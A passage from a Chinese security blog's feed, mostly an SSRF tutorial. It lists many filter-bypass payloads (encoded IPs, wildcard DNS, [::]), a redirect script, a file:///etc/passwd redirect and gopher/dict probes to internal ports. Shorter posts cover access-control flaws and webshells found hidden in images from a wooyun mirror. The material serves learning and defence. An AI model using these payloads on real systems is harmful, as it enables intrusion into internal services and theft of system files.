class="hljs-number">0</span>aquit<br><br>Gopher:<span class="hljs-regexp">//</span><br>ssrf.php?url=gopher:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure><h1 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h1><ol><li>禁止跳转</li><li>过滤返回信息，由于web应用中一般向外部服务器获取同一种类型的资源，因此在把获取结果返回给用户之前先验证返回的信息是否合法</li><li>禁用不需要的协议，仅仅允许http和https协议，可以防止dict、gopher等协议造成的问题（但可以用302绕过，见绕过姿势）</li><li>设置url白名单或者限制内网ip（使用gethostbyname()判断是否为内网ip）</li><li>限制请求端口为常见的web请求端口，如80、443、8080等</li><li>统一的错误信息，避免用户根据错误信息来判断远程服务器的端口状态</li></ol><h1 id="0x05-绕过姿势"><a href="#0x05-绕过姿势" class="headerlink" title="0x05 绕过姿势"></a>0x05 绕过姿势</h1><p>有的会限制以ip形式去访问外部服务器，如127.0.0.1，但可能检测ip的代码或正则写的有问题，就会可以被绕过</p><h2 id="或"><a href="#或" class="headerlink" title="@或#"></a>@或#</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com@127.0.0.1</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//A.com:B@127.0.0.1</span><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">#http:<span class="hljs-comment">//abc</span></span><br></code></pre></td></tr></table></figure><h2 id="添加端口号"><a href="#添加端口号" class="headerlink" title="添加端口号"></a>添加端口号</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h2 id="短地址"><a href="#短地址" class="headerlink" title="短地址"></a>短地址</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">（<span class="hljs-number">1</span>）百度短网址转换：<span class="hljs-keyword">https</span>://dwz.cn<span class="hljs-comment">#不支持ip</span><br>    <span class="hljs-keyword">http</span>://dwz.cn/<span class="hljs-number">11</span>SMa  &gt;&gt;&gt;  <span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>    <br>（<span class="hljs-number">2</span>）TinyURL：<span class="hljs-keyword">https</span>://tinyurl.com/<span class="hljs-built_in">create</span>.php<span class="hljs-comment">#支持ip</span><br>（<span class="hljs-number">3</span>）<span class="hljs-keyword">https</span>://sina.lt/<br></code></pre></td></tr></table></figure><h2 id="泛域名服务-wildcard-DNS"><a href="#泛域名服务-wildcard-DNS" class="headerlink" title="泛域名服务 wildcard DNS"></a>泛域名服务 wildcard DNS</h2><p>可以指向任意ip的域名，利用的原理是DNS解析</p><p><del><a href="xip.io">xip.io</a></del>(已失效)</p><p><a href="nip.io">nip.io</a></p><p><a href="https://sslip.io/">sslip.io</a></p><p><a href="https://local.gd/">local.gd</a> (任意子域名都解析到127.0.0.1)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>.nip.io/<br>http:<span class="hljs-regexp">//</span>www.owasp.org.<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>.nip.io/<br>http:<span class="hljs-regexp">//my</span>site.<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>.nip.io<br>http:<span class="hljs-regexp">//</span>foo.bar.<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>.nip.io<br></code></pre></td></tr></table></figure><h2 id="ip地址转换成进制"><a href="#ip地址转换成进制" class="headerlink" title="ip地址转换成进制"></a>ip地址转换成进制</h2><p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p><ul><li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$</code></li><li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</code></li><li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</code></li></ul><p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>10进制整数格式：3232235521</li><li>16进制整数格式：0xC0A80001</li><li>合并后两位：1.1.278 &#x2F; 1.1.755</li><li>合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</li></ul><p>另外IP中的每一位，各个进制可以混用。</p><p>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</p><p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p><p>– IP进制转换地址：<a href="http://www.vkxss.top/scale.html">转换地址</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">再以<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>这个地址为例：<br><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>的十六进制：<span class="hljs-number">0</span>x7f.<span class="hljs-number">0</span>x00.<span class="hljs-number">0</span>x00.<span class="hljs-number">0</span>x01<br><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>的八进制：<span class="hljs-number">0177.0000</span>.<span class="hljs-number">0000.0001</span><br><br>访问时先将<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>四个位数分别转为十六进制，即<span class="hljs-number">7</span>f，<span class="hljs-number">00</span>，<span class="hljs-number">00</span>，<span class="hljs-number">01</span>，再一起转为八进制，即<span class="hljs-number">17700000001</span>，最后记得访问的时候加<span class="hljs-number">0</span>表示使用八进制(可以是一个<span class="hljs-number">0</span>也可以是多个<span class="hljs-number">0</span> 跟XSS中多加几个<span class="hljs-number">0</span>来绕过过滤一样)，十六进制加<span class="hljs-number">0</span>x<br><br>IP转换为-<span class="hljs-number">16</span>进制-记得访问的时候加<span class="hljs-number">0</span>X表示使用<span class="hljs-number">16</span>进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &gt;&gt;&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">7</span>F000001 &gt;&gt;&gt;http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>X7F000001<br><br>IP转换为-<span class="hljs-number">16</span>进制-转换为八进制-记得访问的时候加<span class="hljs-number">0</span>表示使用八进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">01</span> &gt;&gt;&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">7</span>F000001 &gt;&gt;&gt;http:<span class="hljs-regexp">//</span><span class="hljs-number">17700000001</span>&gt;&gt;&gt;http:<span class="hljs-regexp">//</span><span class="hljs-number">017700000001</span><br><br><span class="hljs-number">127</span>转换为<span class="hljs-number">8</span>进制：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>  &gt;&gt;&gt;  http:<span class="hljs-regexp">//</span><span class="hljs-number">0177.0</span>.<span class="hljs-number">0.1</span>/<br><br>ip地址转换为<span class="hljs-number">10</span>进制：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>  &gt;&gt;&gt;  http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>  &gt;&gt;&gt;  http:<span class="hljs-regexp">//</span><span class="hljs-number">3232235521</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>  &gt;&gt;&gt;  http:<span class="hljs-regexp">//</span><span class="hljs-number">3232235777</span>/<br></code></pre></td></tr></table></figure><h2 id="利用Enclosed-alphanumerics"><a href="#利用Enclosed-alphanumerics" class="headerlink" title="利用Enclosed alphanumerics"></a>利用Enclosed alphanumerics</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  http:<span class="hljs-regexp">//</span>example.com<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ <br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ <br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ <br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ <br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ <br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ <br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ <br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure><h2 id="利用句号"><a href="#利用句号" class="headerlink" title="利用句号"></a>利用句号</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>  &gt;&gt;&gt;  http://<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><h2 id="利用特殊地址"><a href="#利用特殊地址" class="headerlink" title="利用特殊地址"></a>利用特殊地址</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">http://0/<br><br>利用[::]绕过localhost<br><span class="hljs-link">http://</span>[<span class="hljs-string">::</span>]:80/  &gt;&gt;&gt;  http://127.0.0.1<br>也有看到利用http://0000::1:80/的，但是我测试未成功<br><br>win下可以解析畸形的127.0.0.1，如<br>127.1<br>127.01<br>127.0.01<br><br>还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1<br></code></pre></td></tr></table></figure><h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>不详细讲了，直接看这篇吧</p><p><a href="https://exploitcat.blog.csdn.net/article/details/54667714">DNS Rebinding技术绕过SSRF&#x2F;代理IP限制</a></p><h2 id="CRLF-Ascii-Code-—-header-injection"><a href="#CRLF-Ascii-Code-—-header-injection" class="headerlink" title="CRLF ( Ascii Code ) — header injection"></a>CRLF ( Ascii Code ) — header injection</h2><p>经典的比如weblogic的CVE-2014-4210，存在CRLF+SSRF打Redis来getshell，</p><p>此外还有urllib(urllib2)的CVE-2019-9740、CVE-2019-9947存在CRLF的漏洞，如果python的项目中利用了这个库对外请求，则可以被利用来打Redis这些组件</p><h2 id="302重定向绕过"><a href="#302重定向绕过" class="headerlink" title="302重定向绕过"></a>302重定向绕过</h2><p>如果目标做了限制，只能通过域名访问，或不支持某种协议，或者无法访问到内网地址如<code>10.0.0.1</code>，那么可以在自己的云服务器上搭建一个302重定向脚本302.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$port</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><span class="hljs-variable">$scheme</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$scheme</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$data</span>&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Dict协议-dict-fuzz-test-com-8080-hello-dict"><a href="#Dict协议-dict-fuzz-test-com-8080-hello-dict" class="headerlink" title="Dict协议 -&gt; dict:&#x2F;&#x2F;fuzz.test.com:8080&#x2F;hello:dict"></a>Dict协议 -&gt; dict:&#x2F;&#x2F;fuzz.test.com:8080&#x2F;hello:dict</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">/<span class="hljs-number">302.</span>php?s=dict<span class="hljs-variable">&amp;ip</span>=fuzz.test.com<span class="hljs-variable">&amp;port</span>=<span class="hljs-number">8080</span><span class="hljs-variable">&amp;data</span>=hello:dict<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[root@localhost ssrf]# nc -l -vv 8080<span class="hljs-built_in"></span><br><span class="hljs-built_in">Connection </span><span class="hljs-keyword">from</span> 113.108.10.15<span class="hljs-built_in"> port </span>8080 [tcp/webcache] accepted<span class="hljs-built_in"></span><br><span class="hljs-built_in">CLIENT </span>libcurl 7.15.1<br>hello dict<br>QUIT<br></code></pre></td></tr></table></figure><h3 id="Gopher协议-gopher-fuzz-test-com-8080-gopher"><a href="#Gopher协议-gopher-fuzz-test-com-8080-gopher" class="headerlink" title="Gopher协议 -&gt; gopher:&#x2F;&#x2F;fuzz.test.com:8080&#x2F;gopher"></a>Gopher协议 -&gt; gopher:&#x2F;&#x2F;fuzz.test.com:8080&#x2F;gopher</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/302.php?s=gopher&amp;ip=fuzz.test.com&amp;port=8080&amp;data=gopher<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ssrf]<span class="hljs-comment"># nc -l -vv 8080</span><br>Connection from 113.108.10.16 port 8080 [tcp/webcache] accepted<br>GET /gopher HTTP/1.1<br>Host: 106.75.199.107:8080<br>Accept: */*<br></code></pre></td></tr></table></figure><h3 id="File协议-file-etc-passwd"><a href="#File协议-file-etc-passwd" class="headerlink" title="File协议 -&gt; file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd"></a>File协议 -&gt; file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</h3><p>把上面的302.php变一下形，直接请求这个文件即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: file:///etc/passwd&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="0x06-审计技巧"><a href="#0x06-审计技巧" class="headerlink" title="0x06 审计技巧"></a>0x06 审计技巧</h1><h2 id="ssrf常用参数"><a href="#ssrf常用参数" class="headerlink" title="ssrf常用参数"></a>ssrf常用参数</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?h</span>ost=<br><span class="hljs-string">?r</span>edirect=<br><span class="hljs-string">?u</span>ri=<br><span class="hljs-string">?p</span>ath=<br><span class="hljs-string">?c</span>ontinue=<br><span class="hljs-string">?u</span>rl=<br><span class="hljs-string">?w</span>indow=<br><span class="hljs-string">?n</span>ext=<br><span class="hljs-string">?d</span>ata=<br><span class="hljs-string">?i</span>mage-source=<br><span class="hljs-string">?n</span>=<br><span class="hljs-string">?t</span>o=<br><span class="hljs-string">?f</span>ollow=<br><span class="hljs-string">?u</span>=<br><span class="hljs-string">?g</span>o=<br><span class="hljs-string">?f</span>etch=<br><span class="hljs-string">?s</span>ource=<br><span class="hljs-string">?i</span>mg-src=<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zerokeeper.github.io/web-security/ssrf-learning-notes.html">SSRF学习笔记</a></p><p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">解决ubuntu crontab反弹shell失败的问题</a></p><p><a href="http://www.vkxss.top/2019/07/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SSRF%E7%BB%95%E8%BF%87%E7%9A%84%E6%96%B9%E6%B3%95/index.html">SSRF绕过的方法</a></p><p><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html">腾讯某处SSRF漏洞(非常好的利用点)附利用脚本 · 安全手册 (gitbooks.io)</a></p><p><a href="https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html">bilibili某分站从信息泄露到ssrf再到命令执行 · 安全手册 (gitbooks.io)</a></p><p><a href="https://blog.csdn.net/Tencent_SRC/article/details/113210984">SSRF安全指北</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>越权漏洞学习</title>
    <link href="/2022/06/02/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/02/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h1><p>在一个web系统中，一个用户做了一个本不在他的权限范围内的操作，这就是越权。越权又分为水平越权和垂直越权。</p><p>比如一个普通用户，通过修改密码的接口，把别的普通用户的密码改了，这是水平越权。总结来说就是相同权限下本不可以相互访问的用户实现了相互访问</p><p>再比如，在一个系统中只有管理员有删除用户的功能，一个普通用户调用了管理员的删除用户的功能，把另一个用户删除了，这就是垂直越权。垂直越权就是不同级别或者不同角色之间的越权，一般是低权限用户往高权限越权。</p><p>究其根本就是在相关的方法处没有对发起操作的用户身份做核验，没有判断用户是否有权限做该操作。</p><h1 id="0x01-漏洞检测"><a href="#0x01-漏洞检测" class="headerlink" title="0x01 漏洞检测"></a>0x01 漏洞检测</h1><p>其实这个漏洞属于逻辑漏洞，原理很简单，关键是检测思路。这里我按黑、白盒以及水平、垂直越权，分为了四种情况</p><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><p>所谓黑盒就是看不到源码，只有现成的系统</p><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>首先在一个系统里，要标识不同的用户肯定需要一个字段，这个字段名可能为“id”或者“userid”等等，在诸如修改密码等操作的地方，替换成其他用户的id，如果执行成功，就存在水平越权</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>垂直越权的思路很重要，准备好两个不同权限的账号，分别登录同一个网站，查看低权限的用户缺少高权限用户的那些模块，抓取高权限模块的请求参数，再使用低权限用户的身份发送这个请求，看是否能执行成功。能执行成功则存在垂直越权。具体以怎么样的身份方式发送请求。还得看系统，可以只替换cookie，也可以只替换userid之类的参数</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>所谓白盒就是手里有源码，进行代码审计即可</p><p>有代码能够审计的话，在我现在看来水平越权和垂直越权的检查方式差不多，都是检查相关方法是否有相应的权限检查，以及检查权限是否设置正确。</p><p>再或者就是检查鉴权函数是否存在被绕过的可能性</p><h1 id="0x02-防御"><a href="#0x02-防御" class="headerlink" title="0x02 防御"></a>0x02 防御</h1><ol><li>系统应具备完备的用户权限体系，要明确哪些数据属于哪些用户，各自的权限要清晰</li><li>在方法处鉴权</li><li>对用户可控参数做检查和过滤</li></ol>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>越权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>复现weblogic之ssrf</title>
    <link href="/2022/06/02/%E5%A4%8D%E7%8E%B0weblogic%E4%B9%8Bssrf/"/>
    <url>/2022/06/02/%E5%A4%8D%E7%8E%B0weblogic%E4%B9%8Bssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><h1 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h1><h1 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h1><h1 id="0x03-过程"><a href="#0x03-过程" class="headerlink" title="0x03 过程"></a>0x03 过程</h1><h1 id="0x04-踩坑"><a href="#0x04-踩坑" class="headerlink" title="0x04 踩坑"></a>0x04 踩坑</h1><ol><li>没有准确理解反弹shell 的命令，并不会立即反弹shell，而是定时，等到了那个时间点才会执行</li><li>自己的redis不支持，可能是设置问题，</li></ol><p><img src="/image-20220602010332962.png" alt="image-20220602010332962"></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
      <tag>weblogic</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次wooyun漏洞库意外发现的后门</title>
    <link href="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1wooyun%E6%BC%8F%E6%B4%9E%E5%BA%93%E6%84%8F%E5%A4%96%E5%8F%91%E7%8E%B0%E7%9A%84%E5%90%8E%E9%97%A8/"/>
    <url>/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1wooyun%E6%BC%8F%E6%B4%9E%E5%BA%93%E6%84%8F%E5%A4%96%E5%8F%91%E7%8E%B0%E7%9A%84%E5%90%8E%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h1><p>最近在学习各种web漏洞，学习之余就想看看真实案例。于是从github下载了几个wooyun漏洞库玩玩。但由于小严线上的存储桶里也有，我就直接用他的线上存储桶了，没有用到本地下载的wooyun漏洞库。之前下载的文件就一直放那闲置着。</p><p>今天插入了一块很久之前的硬盘，是原来的系统盘，想着格式化了当数据盘用。结果一插入就把我本地的硬盘搞乱了，多出来了很多desktop.ini文件，很是恼火。保险起见怕有病毒就用火绒全盘查杀了一下本机的硬盘。</p><h1 id="0x01-发现问题"><a href="#0x01-发现问题" class="headerlink" title="0x01 发现问题"></a>0x01 发现问题</h1><p>期间就一直放在后台扫描。一个多小时过去了，扫描结果出来。</p><p><img src="/image-20220601120658054.png" alt="image-20220601120658054"></p><p>看着我亲自写的笔记被火绒列为病毒，我刚准备吐槽，一个不是我的笔记的文件进入了我的视线。定睛一看，怎么是个图片，在之前下载的乌云漏洞库的图片文件夹里。查杀结果还显示是个webshell，马上提起十二分精神进到这个目录一探究竟</p><p><img src="/image-20220601120821273.png" alt="image-20220601120821273"></p><h1 id="0x02-排查过程"><a href="#0x02-排查过程" class="headerlink" title="0x02 排查过程"></a>0x02 排查过程</h1><p>文件路径<code>\wooyun_img\10-14\201202\150353371e91fe9129583d4ef9fd17b10577ebaa.jpg</code>，以文本形式打开一看，好家伙，果然有一个活蹦乱跳的webshell</p><p><img src="/image-20220601121222745.png" alt="image-20220601121222745"></p><p>不得了，黑吃黑啊，这要是把项目部署到服务器上，那不就成了肉鸡了。</p><p>去github找到这个仓库，看看issue去</p><p><img src="/image-20220601121342041.png" alt="image-20220601121342041"></p><p>已经有人提出来了，但作者说是文章里要用到的文件，并没有处理这两个webshell，还把这个issue给close掉了。issue里还提到了另一个文件，我查找了一下这个文件，路径在<code>\wooyun_img\15-a\201501\01164029898c19e1752e5afcf54103e6e50f0faa.jpg</code></p><p><img src="/image-20220601123004923.png" alt="image-20220601123004923"></p><p>你才吊毛。。。</p><p>随便加个后缀名用vscode以文本形式打开一看，确认了存在图片马，而这个图片马火绒没有查杀出来，N年前的图片马居然过了火绒。。。</p><p><img src="/image-20220601122040676.png" alt="image-20220601122040676"></p><p>至此，两个webshell处理完成。由于不知道是否存在更多的未被发现的webshell，我已经不敢再用这个库了</p><h1 id="0x03-信息汇总"><a href="#0x03-信息汇总" class="headerlink" title="0x03 信息汇总"></a>0x03 信息汇总</h1><p>涉事的github仓库地址：<code>https://github.com/m0l1ce/wooyunallbugs</code></p><p>两个存在webshell的图片路径：</p><p><code>\wooyun_img\10-14\201202\150353371e91fe9129583d4ef9fd17b10577ebaa.jpg</code></p><p><code>\wooyun_img\15-a\201501\01164029898c19e1752e5afcf54103e6e50f0faa.jpg</code></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><ol><li>用别人开发的web网站或者写的工具，最好自己查一下有没有毒，留个心眼没坏处</li><li>N年前的webshell火绒没查出来，火绒的查杀能力有待加强。不过这也不能怪它，毕竟只是个桌面端的杀毒软件，不是webshell专杀软件</li><li>关于webshell是wooyun本来就有的还是仓库作者自行添加的。后来看了一下文件的修改时间，第一个2012年2月的文章图片，修改时间是2014年5月29日，第二个图片修改时间能跟路径中的年月对应上，都不是在2016年之后修改的。可能确实冤枉了仓库作者，而是文章的作者上传的图片马，被留在了图片目录里，引入到了新的系统。。。所以在新系统里引入别的系统的静态资源也是有风险。另外看了一下现存的一些wooyun镜像站，里面这两个图片也是存在木马。</li></ol><p><img src="/image-20220601125755419.png" alt="image-20220601125755419"></p><p><img src="/image-20220601125842267.png" alt="image-20220601125842267"></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目录遍历学习</title>
